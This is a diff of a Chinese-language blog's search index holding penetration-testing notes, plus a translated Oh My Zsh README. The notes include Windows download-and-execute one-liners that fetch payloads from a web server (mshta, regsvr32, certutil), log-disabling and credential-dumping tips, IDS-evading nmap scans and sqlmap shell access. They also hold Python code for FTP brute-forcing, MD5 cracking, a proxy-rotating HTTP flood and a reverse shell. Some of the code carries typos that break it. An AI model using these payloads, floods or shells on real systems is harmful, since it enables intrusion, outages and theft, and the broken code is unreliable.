+<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
+<li>（针对win10）Mimikatz</li>
+<li>（针对浏览器）Mimikittenz</li>
+</ol>
+<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
+<li>RC脚本自动化Metasploit</li>
+<li>Empire自动化</li>
+<li>Conbalt Strike自动化</li>
+</ol>
+<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
+<li>禁用powershell日志记录</li>
+</ol>
+<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
+<li>利用windows“功能”：<ul>
+<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
+<li><code>mshta http://webserver/payload.hta</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
+<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
+<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
+<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
+<li>C:&gt;<code>..\psgetsys.psl</code></li>
+<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MY FAVOR TOOLS BANK (我的&quot;武器/装备&quot;库)</title>
+    <url>/2022/03/22/My-Attack-Tools/</url>
+    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
+      <categories>
+        <category>开源项目</category>
+        <category>software</category>
+      </categories>
+      <tags>
+        <tag>tools</tag>
+        <tag>open source</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX-PENETRATION</title>
+    <url>/2021/12/25/LINUX-PENETRATION/</url>
+    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
+<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
+<li>NMAP逃逸方案：<ol>
+<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
+<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
+<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
+<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
+<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
+<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
+<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
+</ol>
+</li>
+</ol>
+<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
+<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
+<li>Whois：<code>nmap --script whois [site]</code></li>
+<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
+</ol>
+<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
+<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
+<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
+</ol>
+<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
+<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
+<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
+<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
+</ol>
+<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
+<li><code>sqlmap -u URL --tables</code></li>
+</ol>
+<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
+<li>实质：使用了ASP一类的动态脚本实现</li>
+<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
+</ol>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
+<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
+<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
+<li>将URL分段</li>
+<li>使用<code>--cookie</code>进行连接</li>
+<li>设置<code>--level</code>等级2级以上</li>
+</ol>
+</li>
+</ol>
+<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
+<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
+<li>操作步骤：<ol>
+<li>方法一：<ol start="2">
+<li>获取表单信息进行分析：找出输入框对应参数变量</li>
+<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
+</ol>
+</li>
+<li>方法二：<ol>
+<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
+<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
+<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
+</ol>
+<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
+<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
+<li><code>--os-cmd=xxx</code></li>
+<li><code>--os-shell</code></li>
+</ol>
+<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
+<li>forwar</li>
+<li>drop：放弃当前数据</li>
+<li>intercept is on&#x2F;off：开关</li>
+<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
+<li>Params：GET请求、POST请求、Cookie参数</li>
+<li>Hex：显示Raw选项的16进制内容</li>
+</ol>
+<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
+<li>Action &gt;&gt; Send to Intruder</li>
+<li>Positions:<ol>
+<li>Add$：选中内容设置为变量</li>
+<li>Clean$：重置变量</li>
+<li>Auto$：自动选取变量</li>
+<li>Refresh</li>
+<li>Attack type:<ol>
+<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
+<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
+<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
+<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>Payloads：设置payload模式，配置字典</li>
+<li>start attack：观察len长度，进行筛选</li>
+</ol>
+<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
+<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
+<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
+<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
+<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
+</ul>
+</li>
+</ol>
+<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
+<li>Comparer：自动高亮功能方便比较</li>
+</ol>
+<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
+<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
+<ol>
+<li>hashlib加密明文</li>
+<li>datatime计算程序运行时间</li>
+<li>sys获取输入的密文</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
+<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
+</li>
+<li><p>操作思路：</p>
+<ol>
+<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CC函数定义</p>
+<ol>
+<li>request.ProxyHandler()函数设置代理服务器</li>
+<li>build_opener()函数创建自定义Opener对象</li>
+<li>Install_opener()函数创建opener</li>
+<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行循环</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
+<li><p>服务端：</p>
+<ol>
+<li>导入socket模块</li>
+<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
+<li>通过一个while循环来接受并发送用户执行的命令</li>
+<li>将结果接收回来并打印</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端</p>
+<ol>
+<li>使用subprocess执行获得的用户命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
       </tags>
   </entry>
   <entry>
@@ -2047,6 +2047,154 @@
       </tags>
   </entry>
   <entry>
+    <title>README For Oh My Zsh</title>
+    <url>/2022/04/28/ohmyzsh-readme/</url>
+    <content><![CDATA[<h1 id="关于Oh-My-Zsh"><a href="#关于Oh-My-Zsh" class="headerlink" title="关于Oh My Zsh"></a>关于Oh My Zsh</h1><p>Oh My Zsh是一个开源的，社区驱动的框架，用于管理<a href="https://www.zsh.org/">您的zsh</a>配置。</p>
+<p>听起来很无聊。让我们再试一次。</p>
+<p><strong>哦，我的Zsh不会让你成为10x开发人员…但你可能会觉得自己像一个。</strong></p>
+<p>一旦安装，您的终端外壳将成为镇上的话题<em>或您的钱回来！</em>在命令提示符下每次击键时，您都将利用数百个功能强大的插件和精美的主题。陌生人会在咖啡馆里走到你面前，问你<em>：“这太神奇了！你是某种天才吗？</em></p>
+<p>最后，你将开始得到你一直觉得自己应得的那种关注。…或者，也许您将利用节省的时间更频繁地开始使用牙线。😬</p>
+<p>要了解更多信息，请访问  <a href="https://ohmyz.sh/">ohmyz.sh</a>，在Twitter上关注<a href="https://twitter.com/ohmyzsh">@ohmyzsh</a>，并在<a href="https://discord.gg/ohmyzsh">Discord</a>上加入我们。</p>
+<p><a href="https://github.com/ohmyzsh/ohmyzsh/actions?query=workflow:CI"><img src="https://github.com/ohmyzsh/ohmyzsh/workflows/CI/badge.svg" alt="词"></a>  <a href="https://twitter.com/intent/follow?screen_name=ohmyzsh"><img src="https://camo.githubusercontent.com/11a416635f3d1f03b7a97eac9d92f96b165ffe65a18199d50503e1e5f3c7b633/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6f686d797a73683f6c6162656c3d466f6c6c6f772b406f686d797a7368267374796c653d666c6174" alt="关注@ohmyzsh"></a><a href="https://discord.gg/ohmyzsh"><img src="https://camo.githubusercontent.com/64e8b917c8acd4f1b4c183948adc71b474cd574e5b36882f06c13631ad57ec6f/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f363432343936383636343037323834373436" alt="不和谐服务器"></a><a href="https://gitpod.io/#https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/eed956a921d6c38546e378ad7ee005b423b76361eef47db35b6afb2c71c8a090/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f476974706f642d72656164792d626c75653f6c6f676f3d676974706f64" alt="Gitpod ready"></a><a href="https://huntr.dev/bounties/disclose/?utm_campaign=ohmyzsh/ohmyzsh&utm_medium=social&utm_source=github&target=https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/30c28e8a19d49b9af85a85ca1c2911731b9659e2e8596315faf92162888f162f/68747470733a2f2f63646e2e68756e74722e6465762f68756e74725f73656375726974795f62616467655f6d6f6e6f2e737667" alt="huntr.dev"></a></p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-started"></a>开始</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#prerequisites"></a>先决条件</h3><ul>
+<li>类Unix操作系统：macOS，Linux，BSD。在Windows上：WSL2是首选，但cygwin或msys也大多工作。</li>
+<li>应该安装<a href="https://www.zsh.org/">Zsh</a>（v4.3.9或更新的版本很好，但我们更喜欢5.0.8及更高版本）。如果未预安装（运行以确认），请在此处查看以下wiki说明：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">安装ZSH</a><code>zsh --version</code></li>
+<li><code>curl</code>或应安装<code>wget</code></li>
+<li><code>git</code>应安装（建议使用 v2.4.11 或更高版本）</li>
+</ul>
+<h3 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#basic-installation"></a>基本安装</h3><p>Oh My Zsh 是通过在终端中运行以下命令之一来安装的。您可以通过命令行安装它，也可以使用 或其他类似工具。<code>curl``wget</code></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>curl</strong></td>
+<td><code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
+</tr>
+<tr>
+<td><strong>wget</strong></td>
+<td><code>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
+</tr>
+<tr>
+<td><strong>fetch</strong></td>
+<td><code>sh -c &quot;$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
+</tr>
+</tbody></table>
+<p><em>请注意，任何以前的  <code>.zshrc</code>  都将重命名为  <code>.zshrc.pre-oh-my-zsh</code>。安装后，可以将要保留的配置移动到新的  <code>.zshrc 中</code>。</em></p>
+<h4 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-inspection"></a>手动检查</h4><p>最好从您还不知道的项目中检查安装脚本。为此，您可以先下载安装脚本，浏览它以使一切正常，然后运行它：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh</span><br><span class="line">sh install.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用-Oh-My-Zsh"><a href="#使用-Oh-My-Zsh" class="headerlink" title="使用 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-oh-my-zsh"></a>使用 Oh My Zsh</h2><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#plugins"></a>插件</h3><p>哦，我的Zsh附带了大量插件供您利用。您可以查看<a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins">插件</a>目录和&#x2F;或<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">wiki</a>，以查看当前可用的内容。</p>
+<h4 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins"></a>启用插件</h4><p>一旦你发现一个（或几个）你想与Oh My Zsh一起使用的插件，你就需要在文件中启用它们。您将在目录中找到 zshrc 文件。使用您喜欢的文本编辑器打开它，您将看到一个列出要加载的所有插件的位置。<code>.zshrc``$HOME</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>例如，这可能开始看起来像这样：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  bundler</span><br><span class="line">  dotenv</span><br><span class="line">  macos</span><br><span class="line">  rake</span><br><span class="line">  rbenv</span><br><span class="line">  ruby</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><em>请注意，插件由空格（空格，制表符，新行…）分隔。<strong>不要在</strong>它们之间使用逗号，否则它会中断。</em></p>
+<h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-plugins"></a>使用插件</h4><p>每个内置插件都包含一个<strong>自述文件</strong>，用于记录它。此自述文件应显示别名（如果插件添加了任何别名）以及该特定插件中包含的其他好东西。</p>
+<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#themes"></a>主题</h3><p>我们承认这一点。在Oh My Zsh世界的早期，我们可能有点太快乐了。我们现在捆绑了一百五十多个主题。他们中的大多数在wiki上都有<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">屏幕截图</a>（我们正在努力更新这个！看看他们！</p>
+<h4 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#selecting-a-theme"></a>选择主题</h4><p><em>Robby的主题是默认主题。这不是最花哨的。这不是最简单的一个。这对他来说是正确的。</em></p>
